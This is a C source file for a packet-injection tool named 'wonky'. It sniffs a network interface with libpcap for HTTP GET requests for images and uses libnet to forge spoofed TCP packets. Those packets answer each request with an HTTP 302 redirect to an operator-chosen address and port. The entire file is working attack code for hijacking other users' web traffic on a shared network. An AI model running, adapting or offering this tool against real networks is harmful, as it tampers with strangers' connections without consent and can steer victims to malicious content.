#define __GLIBC__ 1
#include <stdio.h>
#include <unistd.h>
#include <pwd.h>
#include <limits.h>
#include <sys/time.h>
#include <pcap.h>
#include <libnet.h>


#define MAX(x, y) ((x) > (y) ? (x) : (y))

#define SNAPLEN 65535
#define ERRORBUF_SIZE 256

#define RR_LIMIT 5

struct options
{
  libnet_t * libnet;

  char *addr;

  int ether_hdr_sz;
  int verbose;
  int pkt_count;

  long start_port;
  long current_port;
  long server_count;
};




#define VERBOSE1(x) if (popts->verbose >= 1) { x; }
#define VERBOSE0(x) if (popts->verbose >= 0) { x; }

void sniff_handler(u_char *mydata, const struct pcap_pkthdr * head, const u_char * data);

void inject_packet(struct options *popt,
                          u_int32_t seq, u_int32_t ack,
                          u_int32_t saddr, u_int32_t daddr,
                          u_int16_t sport, u_int16_t dport,
                          char *payload, u_int32_t payload_size);


unsigned long getcurrms()
{
  static struct timeval tv;
  gettimeofday( &tv, NULL);
  return (unsigned long) (1000.0 * tv.tv_sec + 0.001 * tv.tv_usec );
}

int
usage()
{
  fprintf(stderr, "\n");
  fprintf(stderr, "Usage:\n");
  fprintf(stderr, "wonky [-v] -d dev -f filter -u user -a address -p start_port -c server_count\n");
  fprintf(stderr, "\n");
  return 1;
}



// Returns true if big starts with small
int
starts_with(char *big, char *small)
{
  return (0 == strncmp(big, small, strlen(small)));
}

// Atol with error checking
// Returns 0 on success
// lng holds the results
int
safe_atol(char *buf, long *lng)
{
  char *ep;
  errno = 0;

  *lng = strtol(buf, &ep, 10);
  if (optarg[0] == '\0' || *ep != '\0')
    return -1;
  if (errno == ERANGE && (*lng == LONG_MAX || *lng == LONG_MIN))
    return -2;

  return 0;
}


// Simple min function
int
min(int a, int b)
{
  return a < b ? a : b;
}


// Splits a string based using 'sep' as the separator characters
// 'sections' is an array of char*
// 'size' is the number of elments in the array
// 'str' is the string to split
// Returns the number of segments in 'str'
// If the return value is greater than size then not all of the segments are found in 'sections'
// Use the min of the return value and 'size' as the number of valid pointers in the array
int
string_split(char **sections, int size, char *sep, char *str)
{
  int i = 0;
  char *res = *sections;

  while (res)
  {
    res = strsep(&str, sep);

    if (i < size)
    {
      sections[i] = res;
    }
    i++;
  }

  return i - 1;
}


int
main(int argc, char **argv)
{
  char ch;
  char errbuf[MAX(ERRORBUF_SIZE, LIBNET_LINK)];
  pcap_t *pcap;
  struct bpf_program fp;
  char * sdev = NULL;
  char * sfilter = NULL;
  struct passwd * pw;
  char *nobody = "nobody";
  struct options opts;

  memset(&opts, 0, sizeof(opts));

	while ((ch = getopt(argc, argv, "d:f:u:a:p:c:v")) != -1)
  {
    switch(ch)
    {
      case 'd':
        sdev = optarg;
        break;
      case 'f':
        sfilter = optarg;
        break;
      case 'u':
        nobody = optarg;
        break;
      case 'a':
        opts.addr = optarg;
        break;
      case 'p':
        if (0 != safe_atol(optarg, &opts.start_port))
        {
          usage();
        }
        opts.current_port = opts.start_port;
        break;
      case 'c':
        if (0 != safe_atol(optarg, &opts.server_count))
        {
          usage();
        }
        break;
      case 'v':
        opts.verbose++;
        break;
      default:
      usage();
        break;
    }
  }

  if (1 >= argc)
  {
    return usage();
  }

  if (geteuid() != 0)
  {
    fprintf(stderr, "Sorry you must be root\n");
    return 1;
  }

  if (NULL == (opts.libnet = libnet_init(LIBNET_RAW4, sdev, errbuf)))
  {
    fprintf(stderr, "Unable to init %s\n", sdev);
    return 1;
  }

  if (NULL == (pcap = pcap_open_live(sdev, SNAPLEN, 1, 1, errbuf)))
  {
    fprintf(stderr, "Unable to open %s\n", sdev);
    return 1;
  }

  if ((pw = getpwnam(nobody)) == NULL)
  {
    fprintf(stderr, "Unable to switch to  %s\n", nobody);
    return 1;
  }
	seteuid(pw->pw_uid);
	setuid(pw->pw_uid);


  int dlt = pcap_datalink(pcap);
  switch (dlt)
  {
    case DLT_NULL:
      opts.ether_hdr_sz = 4;
      break;
    case DLT_EN10MB:
      opts.ether_hdr_sz = LIBNET_ETH_H;
      break;
    case 113:
      opts.ether_hdr_sz = 16;
      break;
    default:
      fprintf(stderr, "Unsupported datalink %u\n", dlt);
      return 1;
      break;
  }

  if (-1 == pcap_compile(pcap, &fp, sfilter, 1, 0))
  {
    fprintf(stderr, "Unable to compile %s\n", sfilter);
    return 1;
  }

  if (-1 == pcap_setfilter(pcap, &fp))
  {
    fprintf(stderr, "Unable to set %s\n", sfilter);
    return 1;
  }

// If we want to make sure that we can inject a packet enable this
#if 0
inject_packet(&opts, 0, 1,
              libnet_name2addr4(opts.libnet, "192.168.41.69", LIBNET_RESOLVE),
              libnet_name2addr4(opts.libnet, "66.102.7.104", LIBNET_RESOLVE),
              9999,
              80,
              NULL,
              0);
#endif

  pcap_loop(pcap, -1, sniff_handler, (u_char*)&opts);

  pcap_close(pcap);

  libnet_destroy(opts.libnet);

  return 0;
}

void sniff_handler(u_char *mydata, const struct pcap_pkthdr * head, const u_char * data)
{
  struct libnet_ipv4_hdr * ip;
  struct libnet_tcp_hdr * tcp;
  char *payload;
  u_int32_t ack, seq, ack_orig, seq_orig;
  char response[1024];
  struct options *popts = (struct options*)mydata;

  VERBOSE1(fprintf(stderr, "Handler called\n"));

  // decode the packet
  ip = (struct libnet_ipv4_hdr *) (data + popts->ether_hdr_sz);
  if (ip->ip_p != IPPROTO_TCP)
  {
    // Skipping non tcp packet
    VERBOSE1(fprintf(stderr, "Skipping not tcp packet\n"));
    return;
  }
  tcp = (struct libnet_tcp_hdr *) ((char*)ip + ip->ip_hl * 4);

  // If we have a packet that a SYN, RST, or FIN
  if (tcp->th_flags & (TH_SYN | TH_RST | TH_FIN))
  {
    VERBOSE1(fprintf(stderr, "Skipping syn/rst/fin packet %x\n", tcp->th_flags));
    return;
  }

  payload = ((char*)tcp + tcp->th_off * 4);

#define GET "GET"
#define WHITE "\t "
#define CRNL "\r\n"
#define HOST "Host:"
#define DOT '.'
#define SLASH '/'

  // Initial sanity check
  if (!starts_with(payload, GET))
  {
    VERBOSE1(fprintf(stderr, "Not a get request\n"));
    return;
  }

#define LINES 20
#define WORDS 5
  char *host;
  char *page;
  char *exn;
  char *lines[LINES];
  char *words[WORDS];

  int lcnt = string_split(lines, LINES, CRNL, payload);
  if (lcnt < 2)
  {
    VERBOSE1(fprintf(stderr, "Malformed get request 0 %u\n", lcnt));
    return;
  }

  int wcnt = string_split(words, WORDS, WHITE, lines[0]);
  if (wcnt < 3)
  {
    VERBOSE1(fprintf(stderr, "Malformed get request 1 %u\n", wcnt));
    return;
  }

  page = words[1];
  exn = words[2];

  int i;
  for (i = 0; i < min(lcnt, LINES); i++)
  {
    if (starts_with(lines[i], HOST))
    {
      if (2 <= string_split(words, WORDS, WHITE, lines[i]))
      {
        host = words[1];
      }
    }
  }

  // Get the exn
  while (exn[-1] != DOT && exn[-1] != SLASH)
  {
    exn--;
  }
  if (exn[-1] == SLASH)
  {
    exn = "html";
  }

  if (strcasecmp(exn, "gif") == 0 ||
      strcasecmp(exn, "jpg") == 0 ||
      strcasecmp(exn, "jpeg") == 0 ||
      strcasecmp(exn, "png") == 0 ||
      strcasecmp(exn, "bmp") == 0 ||
      strcasecmp(exn, "tiff") == 0 ||
      strcasecmp(exn, "") == 0)
  {
    VERBOSE1(fprintf(stderr, "smac!\n"));
  }
  else
  {
    VERBOSE1(fprintf(stderr, "Ignoring unsupported request %s\n", exn));
    return;
  }

  VERBOSE1(fprintf(stderr, "page='%s' host='%s' exn='%s'\n", page, host, exn));


  snprintf(response, sizeof(response), "HTTP/1.1 302 Found\r\nLocation: http://%s:%ld/%s%s\r\n\r\n", popts->addr, popts->current_port++, host, page);
  // XXX if (popts->current_port == popts->start_port + RR_LIMIT)
  {
    popts->current_port = popts->start_port;
  }


  VERBOSE1(fprintf(stderr, "Respond: %s\n", response));

  // KLUDGE around libnet checksum bug
  if (strlen(response) % 2)
  {
    strcat(response, " ");
  }



  // Set the initial seq and ack values
  seq_orig = ack = ntohl(tcp->th_seq);
  ack_orig = seq = ntohl(tcp->th_ack);

  // Adjust the ack
  if ((tcp->th_flags & (TH_SYN | TH_FIN)))
  {
    ack++;
    seq = 0;
  }
  else
  {
    ack += ntohs(ip->ip_len) - (sizeof(struct ip) + (tcp->th_off * 0x4));
  }



  inject_packet(popts,
                 seq, ack,
                 ip->ip_dst.s_addr,
                 ip->ip_src.s_addr,
                 ntohs(tcp->th_dport),
                 ntohs(tcp->th_sport),
                 response, strlen(response));


  VERBOSE1(fprintf(stderr, "ack_orig %u seq_orig %u\n", ack_orig, seq_orig));
  VERBOSE1(fprintf(stderr, "ack %u seq %u\n", ack, seq));
}


void
inject_packet(struct options *popts,
                     u_int32_t seq, u_int32_t ack,
                     u_int32_t saddr, u_int32_t daddr,
                     u_int16_t sport, u_int16_t dport,
                     char *payload, u_int32_t payload_size)
{
  u_int16_t length = 0;
  libnet_ptag_t ptag;

  VERBOSE1(fprintf(stderr, "Injecting %s:%u -> %s:%u len=%u\n",
                           libnet_addr2name4(saddr, LIBNET_DONT_RESOLVE),
                           sport,
                           libnet_addr2name4(daddr, LIBNET_DONT_RESOLVE),
                           dport, payload_size));

  length += payload_size;
  length += LIBNET_TCP_H;
  // src_port dst_port, seq, ack, flags, win, sum, urg, len, payload_len, libnet, ptag
  if (-1 == (ptag = libnet_build_tcp(sport,  // src_port
                                     dport,  // dst_port
                                     seq, // seq
                                     ack, // ack
                                     TH_ACK, // flags
                                     0xff00,  // win
                                     0x0000,  // sum
                                     0x0000,  // urg
                                     length,  // len
                                     (unsigned char*)payload,    // payload
                                     payload_size,    // payload_length
                                     popts->libnet,
                                     0)))
  {
    fprintf(stderr, "Unable to build tcp %s\n", libnet_geterror(popts->libnet));
    return;
  }

  // len tos id frag ttl prot sum
  // src dst payload* payload libnet_t ptag_t
  length += LIBNET_IPV4_H;
  if (-1 == (ptag = libnet_build_ipv4(length,
                                       0x00,
                                       242,
                                       IP_DF,
                                       65,
                                       IPPROTO_TCP,
                                       0x0000,
                                       saddr,
                                       daddr,
                                       NULL,
                                       0,
                                       popts->libnet,
                                       0)))
  {
    fprintf(stderr, "Unable to build ipv4 %s\n", libnet_geterror(popts->libnet));

    return;
  }

  // Send the packet
  if (-1 == libnet_write(popts->libnet))
  {
    fprintf(stderr, "Unable to write %s\n", libnet_geterror(popts->libnet));
    return;
  }

  libnet_clear_packet(popts->libnet);

  VERBOSE0(fprintf(stderr, "Wonked packet %s (%u)\n", payload, ++popts->pkt_count));
}

